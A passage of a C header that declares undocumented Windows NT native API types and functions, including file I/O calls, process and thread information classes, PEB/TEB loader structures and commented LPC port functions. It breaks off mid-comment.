    typedef struct _FILE_LINK_ENTRY_INFORMATION {
        ULONG NextEntryOffset;
        LONGLONG ParentFileId;
        ULONG FileNameLength;
        WCHAR FileName[1];
    } FILE_LINK_ENTRY_INFORMATION, * PFILE_LINK_ENTRY_INFORMATION;

    typedef struct _FILE_LINKS_INFORMATION {
        ULONG BytesNeeded;
        ULONG EntriesReturned;
        FILE_LINK_ENTRY_INFORMATION Entry;
    } FILE_LINKS_INFORMATION, * PFILE_LINKS_INFORMATION;



    typedef enum _FSINFOCLASS {
        FileFsVolumeInformation = 1,
        FileFsLabelInformation,      // 2
        FileFsSizeInformation,       // 3
        FileFsDeviceInformation,     // 4
        FileFsAttributeInformation,  // 5
        FileFsControlInformation,    // 6
        FileFsFullSizeInformation,   // 7
        FileFsObjectIdInformation,   // 8
        FileFsDriverPathInformation, // 9
        FileFsMaximumInformation
    } FS_INFORMATION_CLASS, * PFS_INFORMATION_CLASS;


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtCreateFile(
            OUT PHANDLE FileHandle,
            IN  ACCESS_MASK DesiredAccess,
            IN  POBJECT_ATTRIBUTES ObjectAttributes,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN  PLARGE_INTEGER AllocationSize,
            IN  ULONG FileAttributes,
            IN  ULONG ShareAccess,
            IN  ULONG CreateDisposition,
            IN  ULONG CreateOptions,
            IN  PVOID EaBuffer,
            IN  ULONG EaLength);


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwCreateFile(
            OUT PHANDLE FileHandle,
            IN  ACCESS_MASK DesiredAccess,
            IN  POBJECT_ATTRIBUTES ObjectAttributes,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN  PLARGE_INTEGER AllocationSize,
            IN  ULONG FileAttributes,
            IN  ULONG ShareAccess,
            IN  ULONG CreateDisposition,
            IN  ULONG CreateOptions,
            IN  PVOID EaBuffer,
            IN  ULONG EaLength);


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenFile(
            OUT PHANDLE FileHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN ULONG ShareAccess,
            IN ULONG OpenOptions
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwOpenFile(
            OUT PHANDLE FileHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN ULONG ShareAccess,
            IN ULONG OpenOptions
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryInformationFile(
            IN HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID FileInformation,
            IN ULONG Length,
            IN FILE_INFORMATION_CLASS FileInformationClass
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwQueryInformationFile(
            IN HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID FileInformation,
            IN ULONG Length,
            IN FILE_INFORMATION_CLASS FileInformationClass
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryDirectoryFile(
            IN HANDLE FileHandle,
            IN HANDLE Event OPTIONAL,
            IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
            IN PVOID ApcContext OPTIONAL,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID FileInformation,
            IN ULONG Length,
            IN FILE_INFORMATION_CLASS FileInformationClass,
            IN BOOLEAN ReturnSingleEntry,
            IN PUNICODE_STRING FileName OPTIONAL,
            IN BOOLEAN RestartScan
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwQueryDirectoryFile(
            IN HANDLE FileHandle,
            IN HANDLE Event OPTIONAL,
            IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
            IN PVOID ApcContext OPTIONAL,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID FileInformation,
            IN ULONG Length,
            IN FILE_INFORMATION_CLASS FileInformationClass,
            IN BOOLEAN ReturnSingleEntry,
            IN PUNICODE_STRING FileName OPTIONAL,
            IN BOOLEAN RestartScan
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryVolumeInformationFile(
            IN HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID FsInformation,
            IN ULONG Length,
            IN FS_INFORMATION_CLASS FsInformationClass
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwQueryVolumeInformationFile(
            IN HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID FsInformation,
            IN ULONG Length,
            IN FS_INFORMATION_CLASS FsInformationClass
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtSetInformationFile(
            IN HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN PVOID FileInformation,
            IN ULONG Length,
            IN FILE_INFORMATION_CLASS FileInformationClass
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwSetInformationFile(
            IN HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN PVOID FileInformation,
            IN ULONG Length,
            IN FILE_INFORMATION_CLASS FileInformationClass
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryEaFile(
            IN  HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID Buffer,
            IN  ULONG Length,
            IN  BOOLEAN ReturnSingleEntry,
            IN  PVOID EaList OPTIONAL,
            IN  ULONG EaListLength,
            IN  PULONG EaIndex OPTIONAL,
            IN  BOOLEAN RestartScan);


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwQueryEaFile(
            IN  HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID Buffer,
            IN  ULONG Length,
            IN  BOOLEAN ReturnSingleEntry,
            IN  PVOID EaList OPTIONAL,
            IN  ULONG EaListLength,
            IN  PULONG EaIndex OPTIONAL,
            IN  BOOLEAN RestartScan);


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtSetEaFile(
            IN  HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN  PVOID Buffer,
            IN  ULONG Length);


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwSetEaFile(
            IN  HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN  PVOID Buffer,
            IN  ULONG Length);


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtReadFile(
            IN HANDLE FileHandle,
            IN HANDLE Event OPTIONAL,
            IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
            IN PVOID ApcContext OPTIONAL,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID Buffer,
            IN ULONG Length,
            IN PLARGE_INTEGER ByteOffset OPTIONAL,
            IN PULONG Key OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwReadFile(
            IN HANDLE FileHandle,
            IN HANDLE Event OPTIONAL,
            IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
            IN PVOID ApcContext OPTIONAL,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            OUT PVOID Buffer,
            IN ULONG Length,
            IN PLARGE_INTEGER ByteOffset OPTIONAL,
            IN PULONG Key OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtWriteFile(
            IN HANDLE FileHandle,
            IN HANDLE Event OPTIONAL,
            IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
            IN PVOID ApcContext OPTIONAL,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN PVOID Buffer,
            IN ULONG Length,
            IN PLARGE_INTEGER ByteOffset OPTIONAL,
            IN PULONG Key OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwWriteFile(
            IN HANDLE FileHandle,
            IN HANDLE Event OPTIONAL,
            IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
            IN PVOID ApcContext OPTIONAL,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN PVOID Buffer,
            IN ULONG Length,
            IN PLARGE_INTEGER ByteOffset OPTIONAL,
            IN PULONG Key OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtDeleteFile(
            IN POBJECT_ATTRIBUTES ObjectAttributes
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwDeleteFile(
            IN POBJECT_ATTRIBUTES ObjectAttributes
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtFlushBuffersFile(
            IN HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwFlushBuffersFile(
            IN HANDLE FileHandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtDeviceIoControlFile(
            IN  HANDLE FileHandle,
            IN  HANDLE Event,
            IN  PIO_APC_ROUTINE ApcRoutine,
            IN  PVOID ApcContext,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN  ULONG IoControlCode,
            IN  PVOID InputBuffer,
            IN  ULONG InputBufferLength,
            IN  PVOID OutputBuffer,
            IN  ULONG OutputBufferLength
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwDeviceIoControlFile(
            IN  HANDLE FileHandle,
            IN  HANDLE Event,
            IN  PIO_APC_ROUTINE ApcRoutine,
            IN  PVOID ApcContext,
            OUT PIO_STATUS_BLOCK IoStatusBlock,
            IN  ULONG IoControlCode,
            IN  PVOID InputBuffer,
            IN  ULONG InputBufferLength,
            IN  PVOID OutputBuffer,
            IN  ULONG OutputBufferLength
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtCancelIoFile(
            IN HANDLE Filehandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwCancelIoFile(
            IN HANDLE Filehandle,
            OUT PIO_STATUS_BLOCK IoStatusBlock
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlDosPathNameToNtPathName_U(
            IN  PWSTR DosPathName,
            OUT PUNICODE_STRING NtPathName,
            OUT PWSTR* NtFileNamePart OPTIONAL,
            OUT PCURDIR DirectoryInfo OPTIONAL
        );


    //-----------------------------------------------------------------------------
    // Process functions

#define GDI_HANDLE_BUFFER_SIZE      34

//
// Process Information Classes
//

    typedef enum _PROCESSINFOCLASS {
        ProcessBasicInformation,
        ProcessQuotaLimits,
        ProcessIoCounters,
        ProcessVmCounters,
        ProcessTimes,
        ProcessBasePriority,
        ProcessRaisePriority,
        ProcessDebugPort,
        ProcessExceptionPort,
        ProcessAccessToken,
        ProcessLdtInformation,
        ProcessLdtSize,
        ProcessDefaultHardErrorMode,
        ProcessIoPortHandlers,          // Note: this is kernel mode only
        ProcessPooledUsageAndLimits,
        ProcessWorkingSetWatch,
        ProcessUserModeIOPL,
        ProcessEnableAlignmentFaultFixup,
        ProcessPriorityClass,
        ProcessWx86Information,
        ProcessHandleCount,
        ProcessAffinityMask,
        ProcessPriorityBoost,
        ProcessDeviceMap,
        ProcessSessionInformation,
        ProcessForegroundInformation,
        ProcessWow64Information,
        ProcessImageFileName,
        ProcessLUIDDeviceMapsEnabled,
        ProcessBreakOnTermination,
        ProcessDebugObjectHandle,
        ProcessDebugFlags,
        ProcessHandleTracing,
        MaxProcessInfoClass                             // MaxProcessInfoClass should always be the last enum
    } PROCESSINFOCLASS;

    //
    // Thread Information Classes
    //

    typedef enum _THREADINFOCLASS {
        ThreadBasicInformation,                            // ??
        ThreadTimes,
        ThreadPriority,                                    // ??
        ThreadBasePriority,                                // ??
        ThreadAffinityMask,                                // ??
        ThreadImpersonationToken,                        // HANDLE
        ThreadDescriptorTableEntry,                        // ULONG Selector + LDT_ENTRY
        ThreadEnableAlignmentFaultFixup,                // ??
        ThreadEventPair,                                // ??
        ThreadQuerySetWin32StartAddress,                // ??
        ThreadZeroTlsCell,                                // ??
        ThreadPerformanceCount,                            // ??
        ThreadAmILastThread,                            // ??
        ThreadIdealProcessor,                            // ??
        ThreadPriorityBoost,                            // ??
        ThreadSetTlsArrayAddress,                        // ??
        MaxThreadInfoClass
    } THREADINFOCLASS;


    typedef struct _RTL_DRIVE_LETTER_CURDIR
    {
        USHORT Flags;
        USHORT Length;
        ULONG  TimeStamp;
        STRING DosPath;

    } RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;


    typedef struct _RTL_USER_PROCESS_PARAMETERS
    {
        ULONG MaximumLength;                            // Should be set before call RtlCreateProcessParameters
        ULONG Length;                                   // Length of valid structure
        ULONG Flags;                                    // Currently only PPF_NORMALIZED (1) is known:
                                                        //  - Means that structure is normalized by call RtlNormalizeProcessParameters
        ULONG DebugFlags;

        PVOID ConsoleHandle;                            // HWND to console window associated with process (if any).
        ULONG ConsoleFlags;
        HANDLE StandardInput;
        HANDLE StandardOutput;
        HANDLE StandardError;

        CURDIR CurrentDirectory;                        // Specified in DOS-like symbolic link path, ex: "C:/WinNT/SYSTEM32"
        UNICODE_STRING DllPath;                         // DOS-like paths separated by ';' where system should search for DLL files.
        UNICODE_STRING ImagePathName;                   // Full path in DOS-like format to process'es file image.
        UNICODE_STRING CommandLine;                     // Command line
        PVOID Environment;                              // Pointer to environment block (see RtlCreateEnvironment)
        ULONG StartingX;
        ULONG StartingY;
        ULONG CountX;
        ULONG CountY;
        ULONG CountCharsX;
        ULONG CountCharsY;
        ULONG FillAttribute;                            // Fill attribute for console window
        ULONG WindowFlags;
        ULONG ShowWindowFlags;
        UNICODE_STRING WindowTitle;
        UNICODE_STRING DesktopInfo;                     // Name of WindowStation and Desktop objects, where process is assigned
        UNICODE_STRING ShellInfo;
        UNICODE_STRING RuntimeData;
        RTL_DRIVE_LETTER_CURDIR CurrentDirectores[0x20];
        ULONG EnvironmentSize;
    } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

    //
    // Process Environment Block
    //

    typedef struct _PEB_FREE_BLOCK
    {
        struct _PEB_FREE_BLOCK* Next;
        ULONG Size;

    } PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;


    typedef struct _PEB_LDR_DATA
    {
        ULONG Length;
        BOOLEAN Initialized;
        HANDLE SsHandle;
        LIST_ENTRY InLoadOrderModuleList;               // Points to the loaded modules (main EXE usually)
        LIST_ENTRY InMemoryOrderModuleList;             // Points to all modules (EXE and all DLLs)
        LIST_ENTRY InInitializationOrderModuleList;
        PVOID      EntryInProgress;

    } PEB_LDR_DATA, * PPEB_LDR_DATA;


    typedef struct _LDR_DATA_TABLE_ENTRY
    {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        LIST_ENTRY InInitializationOrderLinks;
        PVOID DllBase;                             // Base address of the module
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
        ULONG  Flags;
        USHORT LoadCount;
        USHORT TlsIndex;
        LIST_ENTRY HashLinks;
        PVOID SectionPointer;
        ULONG CheckSum;
        ULONG TimeDateStamp;
        PVOID LoadedImports;
        PVOID EntryPointActivationContext;
        PVOID PatchInformation;
        PVOID Unknown1;
        PVOID Unknown2;
        PVOID Unknown3;

    } LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


    typedef struct _PEB
    {
        BOOLEAN InheritedAddressSpace;      // These four fields cannot change unless the
        BOOLEAN ReadImageFileExecOptions;   //
        BOOLEAN BeingDebugged;              //
        BOOLEAN SpareBool;                  //
        HANDLE Mutant;                      // INITIAL_PEB structure is also updated.

        PVOID ImageBaseAddress;
        PPEB_LDR_DATA Ldr;
        PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
        PVOID SubSystemData;
        PVOID ProcessHeap;
        PVOID FastPebLock;
        PVOID FastPebLockRoutine;
        PVOID FastPebUnlockRoutine;
        ULONG EnvironmentUpdateCount;
        PVOID KernelCallbackTable;
        HANDLE SystemReserved;
        PVOID  AtlThunkSListPtr32;
        PPEB_FREE_BLOCK FreeList;
        ULONG TlsExpansionCounter;
        PVOID TlsBitmap;
        ULONG TlsBitmapBits[2];         // relates to TLS_MINIMUM_AVAILABLE
        PVOID ReadOnlySharedMemoryBase;
        PVOID ReadOnlySharedMemoryHeap;
        PVOID* ReadOnlyStaticServerData;
        PVOID AnsiCodePageData;
        PVOID OemCodePageData;
        PVOID UnicodeCaseTableData;

        //
        // Useful information for LdrpInitialize

        ULONG NumberOfProcessors;
        ULONG NtGlobalFlag;

        //
        // Passed up from MmCreatePeb from Session Manager registry key
        //

        LARGE_INTEGER CriticalSectionTimeout;
        ULONG HeapSegmentReserve;
        ULONG HeapSegmentCommit;
        ULONG HeapDeCommitTotalFreeThreshold;
        ULONG HeapDeCommitFreeBlockThreshold;

        //
        // Where heap manager keeps track of all heaps created for a process
        // Fields initialized by MmCreatePeb.  ProcessHeaps is initialized
        // to point to the first free byte after the PEB and MaximumNumberOfHeaps
        // is computed from the page size used to hold the PEB, less the fixed
        // size of this data structure.
        //

        ULONG NumberOfHeaps;
        ULONG MaximumNumberOfHeaps;
        PVOID* ProcessHeaps;

        //
        //
        PVOID GdiSharedHandleTable;
        PVOID ProcessStarterHelper;
        PVOID GdiDCAttributeList;
        PVOID LoaderLock;

        //
        // Following fields filled in by MmCreatePeb from system values and/or
        // image header. These fields have changed since Windows NT 4.0,
        // so use with caution
        //

        ULONG OSMajorVersion;
        ULONG OSMinorVersion;
        USHORT OSBuildNumber;
        USHORT OSCSDVersion;
        ULONG OSPlatformId;
        ULONG ImageSubsystem;
        ULONG ImageSubsystemMajorVersion;
        ULONG ImageSubsystemMinorVersion;
        ULONG ImageProcessAffinityMask;
        ULONG GdiHandleBuffer[GDI_HANDLE_BUFFER_SIZE];

    } PEB, * PPEB;


    //
    // Thread environment block
    //

    typedef struct _TEB
    {
        NT_TIB NtTib;
        PVOID  EnvironmentPointer;
        CLIENT_ID ClientId;
        PVOID ActiveRpcHandle;
        PVOID ThreadLocalStoragePointer;
        PPEB ProcessEnvironmentBlock;
        ULONG LastErrorValue;
        ULONG CountOfOwnedCriticalSections;
        PVOID CsrClientThread;
        PVOID Win32ThreadInfo;
        // Incomplete

    } TEB, * PTEB;


    typedef struct _PROCESS_BASIC_INFORMATION
    {
        NTSTATUS ExitStatus;
        PPEB PebBaseAddress;
        ULONG_PTR AffinityMask;
        KPRIORITY BasePriority;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR InheritedFromUniqueProcessId;

    } PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;



#define NtCurrentProcess() ((HANDLE) -1)
#define NtCurrentThread()  ((HANDLE) -2)

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenProcess(
            OUT PHANDLE ProcessHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes,
            IN PCLIENT_ID ClientId OPTIONAL
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtSuspendProcess(
            IN HANDLE ProcessHandle
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtResumeProcess(
            IN HANDLE ProcessHandle
        );

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenThread(
            OUT PHANDLE ThreadHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes,
            IN PCLIENT_ID ClientId OPTIONAL
        );

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryInformationThread(
            IN HANDLE  ThreadHandle,
            IN THREADINFOCLASS  ThreadInformationClass,
            OUT PVOID  ThreadInformation,
            IN ULONG  ThreadInformationLength,
            OUT PULONG  ReturnLength  OPTIONAL
        );

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryInformationProcess(
            IN HANDLE ProcessHandle,
            IN PROCESSINFOCLASS ProcessInformationClass,
            OUT PVOID ProcessInformation,
            IN ULONG ProcessInformationLength,
            OUT PULONG ReturnLength OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtSetInformationProcess(
            IN HANDLE ProcessHandle,
            IN PROCESSINFOCLASS ProcessInformationClass,
            IN PVOID ProcessInformation,
            IN ULONG ProcessInformationLength
        );

    //------------------------------------------------------------------------------
    // LPC Functions

#define MAX_LPC_DATA 0x130    // Maximum number of bytes that can be copied through LPC

// LPC connection types
    typedef enum _LPC_TYPE
    {
        LPC_NEW_MESSAGE,                    // (0) A new message
        LPC_REQUEST,                        // (1) A request message
        LPC_REPLY,                          // (2) A reply to a request message
        LPC_DATAGRAM,                       // (3)
        LPC_LOST_REPLY,                     // (4)
        LPC_PORT_CLOSED,                    // (5) Send when port is deleted
        LPC_CLIENT_DIED,                    // (6) Messages to thread termination ports
        LPC_EXCEPTION,                      // (7) Messages to thread exception ports
        LPC_DEBUG_EVENT,                    // (8) Messages to thread debug port
        LPC_ERROR_EVENT,                    // (9) Used by NtRaiseHardError
        LPC_CONNECTION_REQUEST              // (A) Used by NtConnectPort

    } LPC_TYPE, * PLPC_TYPE;

    //
    // Define header for Port Message
    //

    typedef struct _PORT_MESSAGE
    {
        USHORT DataLength;                  // Length of data following the header (bytes)
        USHORT TotalLength;                 // Length of data + sizeof(PORT_MESSAGE)
        USHORT Type;                        // Type of the message (See LPC_TYPE enum)
        USHORT VirtualRangesOffset;         // Offset of array of virtual address ranges
        CLIENT_ID ClientId;                 // Client identifier of the message sender
        ULONG  MessageId;                   // Identifier of the particular message instance
        union
        {
            ULONG  CallbackId;              //
            ULONG  ClientViewSize;          // Size, in bytes, of section created by the sender
        };

    } PORT_MESSAGE, * PPORT_MESSAGE;

    //
    // Define structure for initializing shared memory on the caller's side of the port
    //

    typedef struct _PORT_VIEW {

        ULONG  Length;                      // Size of this structure
        HANDLE SectionHandle;               // Handle to section object with
                                            // SECTION_MAP_WRITE and SECTION_MAP_READ
        ULONG  SectionOffset;               // The offset in the section to map a view for
                                            // the port data area. The offset must be aligned
                                            // with the allocation granularity of the system.
        ULONG  ViewSize;                    // The size of the view (in bytes)
        PVOID  ViewBase;                    // The base address of the view in the creator
                                            //
        PVOID  ViewRemoteBase;              // The base address of the view in the process
                                            // connected to the port.
    } PORT_VIEW, * PPORT_VIEW;

    //
    // Define structure for shared memory coming from remote side of the port
    //

    typedef struct _REMOTE_PORT_VIEW {

        ULONG Length;                       // Size of this structure
        ULONG ViewSize;                     // The size of the view (bytes)
        PVOID ViewBase;                     // Base address of the view

    } REMOTE_PORT_VIEW, * PREMOTE_PORT_VIEW;

    /*++

        NtCreatePort
        ============

        Creates a LPC port object. The creator of the LPC port becomes a server
        of LPC communication

        PortHandle - Points to a variable that will receive the
            port object handle if the call is successful.

        ObjectAttributes - Points to a structure that specifies the object s
            attributes. OBJ_KERNEL_HANDLE, OBJ_OPENLINK, OBJ_OPENIF, OBJ_EXCLUSIVE,
            OBJ_PERMANENT, and OBJ_INHERIT are not valid attributes for a port object.

        MaxConnectionInfoLength - The maximum size, in bytes, of data that can
            be sent through the port.

        MaxMessageLength - The maximum size, in bytes, of a message
            that can be sent through the port.

        MaxPoolUsage - Specifies the maximum amount of NonPaged pool that can be used for
            message storage. Zero means default value.

        ZwCreatePort verifies that (MaxDataSize <= 0x104) and (MaxMessageSize <= 0x148).

    --*/

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtCreatePort(
            OUT PHANDLE PortHandle,
            IN  POBJECT_ATTRIBUTES ObjectAttributes,
            IN  ULONG MaxConnectionInfoLength,
            IN  ULONG MaxMessageLength,
            IN  ULONG MaxPoolUsage
        );


    /*++

        NtConnectPort
        =============

        Creates a port connected to a named port (cliend side).

        PortHandle - A pointer to a variable that will receive the client
            communication port object handle value.

        PortName - Points to a structure that specifies the name
            of the port to connect to.

        SecurityQos - Points to a structure that specifies the level
            of impersonation available to the port listener.

        ClientView - Optionally points to a structure describing
            the shared memory region used to send large amounts of data
            to the listener; if the call is successful, this will be updated.

        ServerView - Optionally points to a caller-allocated buffer
            or variable that receives information on the shared memory region
            used by the listener to send large amounts of data to the
            caller.

        MaxMessageLength - Optionally points to a variable that receives the size,
            in bytes, of the largest message that can be sent through the port.

        ConnectionInformation - Optionally points to a caller-allocated
            buffer or variable that specifies connect data to send to the listener,
            and receives connect data sent by the listener.

        ConnectionInformationLength - Optionally points to a variable that
            specifies the size, in bytes, of the connect data to send
            to the listener, and receives the size of the connect data
            sent by the listener.

    --*/

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtConnectPort(
            OUT PHANDLE PortHandle,
            IN  PUNICODE_STRING PortName,
            IN  PSECURITY_QUALITY_OF_SERVICE SecurityQos,
            IN  OUT PPORT_VIEW ClientView OPTIONAL,
            OUT PREMOTE_PORT_VIEW ServerView OPTIONAL,
            OUT PULONG MaxMessageLength OPTIONAL,
            IN  OUT PVOID ConnectionInformation OPTIONAL,
            IN  OUT PULONG ConnectionInformationLength OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwConnectPort(
            OUT PHANDLE PortHandle,
            IN  PUNICODE_STRING PortName,
            IN  PSECURITY_QUALITY_OF_SERVICE SecurityQos,
            IN  OUT PPORT_VIEW ClientView OPTIONAL,
            OUT PREMOTE_PORT_VIEW ServerView OPTIONAL,
            OUT PULONG MaxMessageLength OPTIONAL,
            IN  OUT PVOID ConnectionInformation OPTIONAL,
            IN  OUT PULONG ConnectionInformationLength OPTIONAL
        );


    /*++

        NtListenPort
        ============

        Listens on a port for a connection request message on the server side.

        PortHandle - A handle to a port object. The handle doesn't need
            to grant any specific access.

        ConnectionRequest - Points to a caller-allocated buffer
            or variable that receives the connect message sent to
            the port.

    --*/


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtListenPort(
            IN  HANDLE PortHandle,
            OUT PPORT_MESSAGE RequestMessage
        );

    /*++

        NtAcceptConnectPort
        ===================

        Accepts or rejects a connection request on the server side.

        PortHandle - Points to a variable that will receive the port object
            handle if the call is successful.

        PortContext - A numeric identifier to be associated with the port.

        ConnectionRequest - Points to a caller-allocated buffer or variable
            that identifies the connection request and contains any connect
            data that should be returned to requestor of the connection

        AcceptConnection - Specifies whether the connection should
            be accepted or not

        ServerView - Optionally points to a structure describing
            the shared memory region used to send large amounts of data to the
            requestor; if the call is successful, this will be updated

        ClientView - Optionally points to a caller-allocated buffer
            or variable that receives information on the shared memory
            region used by the requestor to send large amounts of data to the
            caller

    --*/


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtAcceptConnectPort(
            OUT PHANDLE PortHandle,
            IN  PVOID PortContext OPTIONAL,
            IN  PPORT_MESSAGE ConnectionRequest,
            IN  BOOLEAN AcceptConnection,
            IN  OUT PPORT_VIEW ServerView OPTIONAL,
            OUT PREMOTE_PORT_VIEW ClientView OPTIONAL
        );

    /*++

        NtCompleteConnectPort
        =====================

        Completes the port connection process on the server side.

        PortHandle - A handle to a port object. The handle doesn't need
            to grant any specific access.

    --*/


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtCompleteConnectPort(
            IN  HANDLE PortHandle
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwCompleteConnectPort(
            IN  HANDLE PortHandle
        );


    /*++

        NtRequestPort
        =============

        Sends a request message to a port (client side)

        PortHandle - A handle to a port object. The handle doesn't need
            to grant any specific access.

        RequestMessage - Points to a caller-allocated buffer or variable
            that specifies the request message to send to the port.

    --*/

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtRequestPort(
            IN  HANDLE PortHandle,
            IN  PPORT_MESSAGE RequestMessage
        );

    /*++

        NtRequestWaitReplyPort
        ======================

        Sends a request message to a port and waits for a reply (client side)

        PortHandle - A handle to a port object. The handle doesn't need
            to grant any specific access.

        RequestMessage - Points to a caller-allocated buffer or variable
            that specifies the request message to send to the port.

        ReplyMessage - Points to a caller-allocated buffer or variable
            that receives the reply message sent to the port.

    --*/

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtRequestWaitReplyPort(
            IN  HANDLE PortHandle,
            IN  PPORT_MESSAGE RequestMessage,
            OUT PPORT_MESSAGE ReplyMessage
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwRequestWaitReplyPort(
            IN  HANDLE PortHandle,
            IN  PPORT_MESSAGE RequestMessage,
            OUT PPORT_MESSAGE ReplyMessage
        );


    /*++

        NtReplyPort
        ===========

        Sends a reply message to a port (Server side)

        PortHandle - A handle to a port object. The handle doesn't need
            to grant any specific access.

        ReplyMessage - Points to a caller-allocated buffer or variable
            that specifies the reply message to send to the port.

    --*/


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtReplyPort(
            IN  HANDLE PortHandle,
            IN  PPORT_MESSAGE ReplyMessage
        );

    /*++

        NtReplyWaitReplyPort
        ====================

        Sends a reply message to a port and waits for a reply message

        PortHandle - A handle to a port object. The handle doesn't need
            to grant any specific access.

        ReplyMessage - Points to a caller-allocated buffer or variable
            that specifies the reply message to send to the port.

    --*/

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtReplyWaitReplyPort(
            IN  HANDLE PortHandle,
            IN  OUT PPORT_MESSAGE ReplyMessage
        );


    /*++

        NtReplyWaitReceivePort
        ======================

        Optionally sends a reply message to a port and waits for a
        message

        PortHandle - A handle to a port object. The handle doesn't need
            to grant any specific access.

        PortContext - Optionally points to a variable that receives
            a numeric identifier associated with the port.

        ReplyMessage - Optionally points to a caller-allocated buffer
            or variable that specifies the reply message to send to the port.

        ReceiveMessage - Points to a caller-allocated buffer or variable
